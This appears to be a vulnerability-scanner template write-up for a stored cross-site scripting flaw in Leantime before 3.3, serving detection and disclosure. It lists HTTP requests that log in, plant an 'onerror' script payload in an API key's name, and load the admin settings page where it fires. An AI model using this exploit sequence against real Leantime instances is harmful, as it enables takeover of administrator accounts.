# Nuclei Template: Leantime < 3.3 = Cross-Site Scripting
**Template ID:** leantime-stored-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`leantime-stored-xss.yaml`)

## Vulnerability Information & PoC

## Description
Any low privileged user like manager, or editor, can create an API key with XSS payload. When admin will visit the Company page, the XSS will automatically get triggerred leading to the unauthorized action performed from the ADMIN account. Like, removing any user, or adding someone else as high privilege, and many more.

## Steps to reproduce / Exploit Payload
```http
POST /auth/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

redirectUrl=http%253A%252F%252F{{Hostname}}%252Fdashboard%252Fhome&username={{username}}&password={{password}}&login=Login

POST /api/newApiKey HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

save=1&firstname=%3Cimg+src%3Dx+onerror%3Dalert(document.domain)%3E&role=5&status=a&submitAction=Save

GET /setting/editCompanySettings/ HTTP/1.1
Host: {{Hostname}}
```

## References
- https://github.com/advisories/GHSA-c39w-3pjx-qc7m
